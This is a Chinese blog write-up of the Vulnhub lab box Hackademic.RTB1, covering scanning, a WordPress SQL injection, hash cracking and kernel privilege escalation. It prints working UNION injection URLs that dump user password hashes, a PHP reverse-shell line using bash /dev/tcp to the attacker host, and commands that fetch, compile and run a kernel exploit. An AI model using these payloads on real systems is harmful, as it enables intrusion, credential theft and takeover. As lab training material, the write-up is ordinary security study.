---
title: Vulnhub-Hackademic RTB1
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# Hackademic.RTB1

第一次打靶机，思路看的红队笔记

> [https://www.vulnhub.com/entry/hackademic-rtb1,17/](https://www.vulnhub.com/entry/hackademic-rtb1,17/)
> 

环境：kali Linux - 192.168.75.131，靶机 - 192.168.75.132

## 主机发现和端口扫描

1.  扫描整个网络有哪台机子在线，不进行端口扫描
    
    ```php
    nmap -sP 192.168.75.0/24 
    ```
    
    ```php
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-19 09:41 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00027s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00018s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.132
    Host is up (0.00039s latency).
    MAC Address: 00:0C:29:B7:EB:D3 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00058s latency).
    MAC Address: 00:50:56:F8:B3:1A (VMware)
    Nmap scan report for 192.168.75.131
    Host is up.
    Nmap done: 256 IP addresses (5 hosts up) scanned in 2.01 seconds
    ```
    
    因为靶机是我最后添加的，所以基本可以锁定是`132`
    
2. 执行快速扫描全端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.132
    ```
    
    ```php
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-19 09:44 CST
    Nmap scan report for 192.168.75.132
    Host is up (0.0014s latency).
    Not shown: 65514 filtered tcp ports (no-response), 19 filtered tcp ports (host-unreach)
    PORT   STATE  SERVICE
    22/tcp closed ssh
    80/tcp open   http
    MAC Address: 00:0C:29:B7:EB:D3 (VMware)
    
    Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
    ```
    
    扫描出两个端口22和80，不过因为22是关闭的所以没什么用处，剩下一个80端口
    
3. 针对地址使用TCP扫描，探测端口22和80上的服务版本以及操作系统
    
    ```php
    nmap -sV -sT -O -p22,80 192.168.75.132     
    ```
    
    ```php
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-19 09:49 CST
    Nmap scan report for 192.168.75.132
    Host is up (0.00076s latency).
    
    PORT   STATE  SERVICE VERSION
    22/tcp closed ssh
    80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
    MAC Address: 00:0C:29:B7:EB:D3 (VMware)
    Device type: general purpose
    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6
    OS details: Linux 2.6.22 - 2.6.36
    Network Distance: 1 hop
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 8.57 seconds
    ```
    
    探测到是服务器是`Apache2.2.15`系统是红帽`Dedora`
    
4. 扫描UDP端口
    
    ```php
    nmap -sU -min-rate 10000 -p- 192.168.75.132
    ```
    
    ```php
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-19 09:53 CST
    Warning: 192.168.75.132 giving up on port because retransmission cap hit (10).
    Nmap scan report for 192.168.75.132
    Host is up (0.00094s latency).
    All 65535 scanned ports on 192.168.75.132 are in ignored states.
    Not shown: 65457 open|filtered udp ports (no-response), 78 filtered udp ports (host-prohibited)
    MAC Address: 00:0C:29:B7:EB:D3 (VMware)
    
    Nmap done: 1 IP address (1 host up) scanned in 72.94 seconds
    ```
    
    没有UDP端口打开
    
5. 漏洞扫描
    
    ```php
    nmap -script=vuln -p 22,80 192.168.75.132
    ```
    
    ```php
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-19 09:56 CST
    Nmap scan report for 192.168.75.132
    Host is up (0.00085s latency).
    
    PORT   STATE  SERVICE
    22/tcp closed ssh
    80/tcp open   http
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-trace: TRACE is enabled
    | http-enum: 
    |_  /icons/: Potentially interesting folder w/ directory listing
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    | http-vuln-cve2011-3192: 
    |   VULNERABLE:
    |   Apache byterange filter DoS
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2011-3192  BID:49303
    |       The Apache web server is vulnerable to a denial of service attack when numerous
    |       overlapping byte ranges are requested.
    |     Disclosure date: 2011-08-19
    |     References:
    |       https://www.securityfocus.com/bid/49303
    |       https://seclists.org/fulldisclosure/2011/Aug/175
    |       https://www.tenable.com/plugins/nessus/55976
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       http://ha.ckers.org/slowloris/
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    MAC Address: 00:0C:29:B7:EB:D3 (VMware)
    
    Nmap done: 1 IP address (1 host up) scanned in 145.51 seconds
    ```
    
    找到个有趣的文件夹  `/icons/` ，并且该靶机容易遭受`DDos` ，不过对我们没有帮助
    

## 渗透阶段

1. 访问主机web服务1
    
    ![image.png](image.png)
    
    点击target目标得到信息，就是然我们获得root权限，然后读取key.txt
    
    ```php
    Got root?!
    Friday, January 7, 2011 | 4:08 am
    
    This is the first Realistic Hackademic Challenge (root this box).
    Have you got the skills to exploit this box and to take root?
    
    Goal:
    Gain access to the (HackademicRTB1) box and read the “Key.txt” file in the root directory.
    ```
    
2. 发现，点击页面的`Get root`链接后的url是这样的
    
    ```php
    http://192.168.75.132/Hackademic_RTB1/?p=9
    ```
    
    以及下方 `Uncategorized` 的链接
    
    ```php
    http://192.168.75.132/Hackademic_RTB1/?cat=1
    ```
    
    `?p` 以及`?cat`很可能存在`sql`注入漏洞
    
3. 尝试一下`sql`注入和文件包含
    
    `p`参数无任何回显，应该不存在sql注入和文件包含
    
    `cat`输入`1'` ,发现页面回显有问题，把sql语句爆了出来，`SELECT * FROM wp_categories WHERE cat_ID = 1\\\' LIMIT 1` ，并且可以看到表是`wp_categories` 
    
    ![image.png](image%201.png)
    
4. 尝试注入，手工
    
    ```php
    // 存在注入点
    http://192.168.75.132/Hackademic_RTB1/?cat=1 and 1=2
    // 表的列数有五列
    http://192.168.75.132/Hackademic_RTB1/?cat=1 order by 5
    // 爆回显位，页面回显位是第二位
    http://192.168.75.132/Hackademic_RTB1/?cat=0 union select 1,2,3,4,5
    // 爆库，页面回显 wordpress ，表示库名是wordpress 
    http://192.168.75.132/Hackademic_RTB1/?cat=0 union select 1,database(),3,4,5
    ```
    
5. 发现库名是`wordpress` ，猜测CMS是`wordpress` ，我们寻找一下看看有没有有用的信息
    
    ![image.png](image%202.png)
    
    发现确实是`wordpress`并且版本是`1.5.11`
    
6. 为了方便注入，我们到网上查找`wordpress`的表结构
    
    > [https://codex.wordpress.org/Database_Description](https://codex.wordpress.org/Database_Description/2.0)
    > 
    
    值得我们关注的是 **`wp_users`**表
    
    `user_login`，`user_pass`，`user_level` 中的三个字段
    
7. 接着注入
    
    获取表的`user_login`，`user_pass`，`user_level` 中的三个字段，并以`-`为分隔符
    
    ```php
    http://192.168.75.132/Hackademic_RTB1/?cat=0 union select 1,group_concat(user_login,0x2d,user_pass,0x2d,user_level),3,4,5 from wp_users
    ```
    
    得到数据：
    
    ```php
    NickJames-21232f297a57a5a743894a0e4a801fc3-1,
    JohnSmith-b986448f0bb9e5e124ca91d3d650f52c-0,
    GeorgeMiller-7cbb3252ba6b7e9c422fac5334d22054-10,
    TonyBlack-a6e514f9486b83cb53d8d932f9a04292-0,
    JasonKonnors-8601f6e1028a8e8a966f6c33fcd9aec4-0,
    MaxBucky-50484c19f1afdaf3841a0d821ed393d2-0
    ```
    
    可以发现`GeorgeMiller` 的权限是10是最大的，密码格式看着像是`md5`，我们拿到cmd5破解
    
    查询结果：`q1w2e3`
    
8. 我们找到后台，使用`GeorgeMiller` 登陆进去
    
    后台地址是 ： `http://192.168.75.132/Hackademic_RTB1/wp-login.php`
    
    登陆成功！
    

## 登录后台上传shell

登陆后台后，wordpress我们一般要做的是打开文件上传功能，并且上传getshell

1. 开启文件上传功能，并且添加php后缀
    
    ![image.png](image%203.png)
    
2. 上传getshell.php
    
    ![image.png](image%204.png)
    
    文件内容是：
    
    ```php
    // getshell.php
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.75.131/1234 0>&1'"); ?>
    ```
    
    上传成功,并且返回路径 `/Hackademic_RTB1/wp-content/getshell.php`
    
3. 反弹shell
    
    首先Kali先开启监听，监听`1234`端口
    
    ```php
    nc -lvp 1234                             
    listening on [any] 1234 ...
    ```
    
    再访问`/Hackademic_RTB1/wp-content/getshell.php`
    
    最后查看kali，发现反弹shell成功
    
    ```php
    istening on [any] 1234 ...
    192.168.75.132: inverse host lookup failed: Unknown host
    connect to [192.168.75.131] from (UNKNOWN) [192.168.75.132] 49339
    bash: no job control in this shell
    bash-4.0$ ls
    ls
    getshell.php
    getshell_01.php
    plugins
    themes
    bash-4.0$ 
    ```
    

## 提权

1. 先用python增强shell的交互性
    
    ```php
    // 靶机shell
    python -c "import pty;pty.spawn('/bin/bash')"
    ```
    
2. 查看shell权限
    
    ```php
    // 靶机shell
    bash-4.0$ whoami
    apache
    
    bash-4.0$ dpkg -l
    bash: dpkg: command not found
    
    bash-4.0$ sudo -l
    sudo: sorry, you must have a tty to run sudo
    
    bash-4.0$ uname -a
    Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
    
    ```
    
    用户是`apache` ，`dpkg`和 `sudo` 无法使用，内核版本是`2.6.31.5` ，权限是比较低的
    
3. 因为ssh是关闭的，所以我们找密码也没有用处，看到内核版本比较老，可以尝试一下搜索内核漏洞，但是内核版本不太太详细，否则或错过一些好使的漏洞，并且过滤 “`Privilege Escalation`” - 权限提升
    
    ```php
    searchsploit Linux Kernel 2.6 | grep "Privilege Escalation"
    ```
    
    ```php
    Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation | solaris/local/15962.c
    Linux Kernel 2.2.25/2.4.24/2.6.2 - 'mremap()' Local Privilege Escalation  | linux/local/160.c
    Linux Kernel 2.4.x/2.6.x - 'uselib()' Local Privilege Escalation (3)      | linux/local/895.c
    Linux Kernel 2.4/2.6 - 'sock_sendpage()' Local Privilege Escalation (3)   | linux/local/9641.txt
    Linux Kernel 2.6.0 < 2.6.31 - 'pipe.c' Local Privilege Escalation (1)     | linux/local/33321.c
    Linux Kernel 2.6.10 < 2.6.31.5 - 'pipe.c' Local Privilege Escalation      | linux/local/40812.c
    Linux Kernel 2.6.13 < 2.6.17.4 - 'sys_prctl()' Local Privilege Escalation | linux/local/2004.c
    Linux Kernel 2.6.13 < 2.6.17.4 - 'sys_prctl()' Local Privilege Escalation | linux/local/2005.c
    Linux Kernel 2.6.13 < 2.6.17.4 - 'sys_prctl()' Local Privilege Escalation | linux/local/2006.c
    Linux Kernel 2.6.13 < 2.6.17.4 - 'sys_prctl()' Local Privilege Escalation | linux/local/2011.sh
    Linux Kernel 2.6.17 - 'Sys_Tee' Local Privilege Escalation                | linux/local/29714.txt
    Linux Kernel 2.6.17 < 2.6.24.1 - 'vmsplice' Local Privilege Escalation (2 | linux/local/5092.c
    Linux Kernel 2.6.17.4 - 'proc' Local Privilege Escalation                 | linux/local/2013.c
    Linux Kernel 2.6.18 < 2.6.18-20 - Local Privilege Escalation              | linux/local/10613.c
    Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation         | linux/local/50135.c
    Linux Kernel 2.6.23 < 2.6.24 - 'vmsplice' Local Privilege Escalation (1)  | linux/local/5093.c
    Linux Kernel 2.6.28/3.0 (DEC Alpha Linux) - Local Privilege Escalation    | linux/local/17391.c
    Linux Kernel 2.6.32 - 'pipe.c' Local Privilege Escalation (4)             | linux/local/10018.sh
    Linux Kernel 2.6.36-rc8 - 'RDS Protocol' Local Privilege Escalation       | linux/local/15285.c
    Linux Kernel 2.6.x - 'pipe.c' Local Privilege Escalation (2)              | linux/local/33322.c
    Linux Kernel 2.6.x - Ext4 'move extents' ioctl Privilege Escalation       | linux/local/33395.txt
    Linux Kernel 2.6.x - Ptrace Privilege Escalation                          | linux/local/30604.c
    Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                | linux/local/41886.c
    Linux Kernel < 2.6.11.5 - BlueTooth Stack Privilege Escalation            | linux/local/4756.c
    Linux Kernel < 2.6.22 - 'ftruncate()'/'open()' Local Privilege Escalation | linux/local/6851.c
    Linux Kernel < 2.6.28 - 'fasync_helper()' Local Privilege Escalation      | linux/local/33523.c
    Linux Kernel < 2.6.29 - 'exit_notify()' Local Privilege Escalation        | linux/local/8369.sh
    Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation         | linux/local/34923.c
    Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation | arm/local/31574.c
    Linux kernel < 4.10.15 - Race Condition Privilege Escalation              | linux/local/43345.c
    Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation    | linux/local/44298.c
    ```
    
    可以尝试一下这两个
    
    ```php
    Linux Kernel 2.6.36-rc8 - 'RDS Protocol' Local Privilege Escalation       | linux/local/15285.c
    Linux Kernel 2.6.x - 'pipe.c' Local Privilege Escalation (2)              | linux/local/33322.c
    ```
    
4. 在`kali`使用 `searchsploit -m <name>` 拉取下来,并且使用`php -S 0:80` 再当前目录创建web服务器（方便靶机下载）
    
    ```php
    earchsploit -m 15285.c
    earchsploit -m 33322.c
    php -S 0:80
    ```
    
5. 使用靶机的shell下载拉取下来的`payload`
    
    ```php
    // 靶机shell
    bash-4.0$ wget 192.168.75.131/33322.c // 重复操作
    
    --2024-09-19 04:51:42--  http://192.168.75.131/33322.c
    Connecting to 192.168.75.131:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 4517 (4.4K) [text/x-c]
    Saving to: `33322.c'
    
         0K ....                                                  100% 5.94M=0.001s
    
    2024-09-19 04:51:42 (5.94 MB/s) - `33322.c' saved [4517/4517]
    ```
    
6. 我自己尝试了33322.c不成功，所以再尝试15285.c
    
    ```php
    // 靶机shell
    gcc 15285.c -o 15285 // 编译
    
    ./15285 //运行
    
    ```
    
    ```php
    [*] Linux kernel >= 2.6.30 RDS socket exploit
    [*] by Dan Rosenberg
    [*] Resolving kernel addresses...
     [+] Resolved security_ops to 0xc0aa19ac
     [+] Resolved default_security_ops to 0xc0955c6c
     [+] Resolved cap_ptrace_traceme to 0xc055d9d7
     [+] Resolved commit_creds to 0xc044e5f1
     [+] Resolved prepare_kernel_cred to 0xc044e452
    [*] Overwriting security ops...
    [*] Linux kernel >= 2.6.30 RDS socket exploit
    [*] by Dan Rosenberg
    [*] Resolving kernel addresses...
     [+] Resolved security_ops to 0xc0aa19ac
     [+] Resolved default_security_ops to 0xc0955c6c
     [+] Resolved cap_ptrace_traceme to 0xc055d9d7
     [+] Resolved commit_creds to 0xc044e5f1
     [+] Resolved prepare_kernel_cred to 0xc044e452
    [*] Overwriting security ops...
    [*] Overwriting function pointer...
    [*] Linux kernel >= 2.6.30 RDS socket exploit
    [*] by Dan Rosenberg
    [*] Resolving kernel addresses...
     [+] Resolved security_ops to 0xc0aa19ac
     [+] Resolved default_security_ops to 0xc0955c6c
     [+] Resolved cap_ptrace_traceme to 0xc055d9d7
     [+] Resolved commit_creds to 0xc044e5f1
     [+] Resolved prepare_kernel_cred to 0xc044e452
    [*] Overwriting security ops...
    [*] Overwriting function pointer...
    [*] Triggering payload...
    [*] Restoring function pointer...
    ```
    
7. 一长串操作后，我们输入`whoami`尝试，提权成功！
    
    ```php
    // 靶机shell
    whoami
    root
    ```
    
8. 寻找之前说的`key.txt` ，`flag`可能就住在里面
    
    ```php
    // 靶机shell
    cd root // 发现root文件夹下存在key.txt
    cat key.txt // 读取
    ```
    
    `$_d&jgQ>>ak\#b"(Hx"o<la_%` 可能就是`flag`
    
    ```php
    Yeah!!
    You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)
    
    $_d&jgQ>>ak\#b"(Hx"o<la_%
    
    Regards,
    mr.pr0n || p0wnbox.Team || 2011
    http://p0wnbox.com
    
    ```
    

## 思路

前端发现id参数，尝试sql注入进入到后台，提权使用内核提权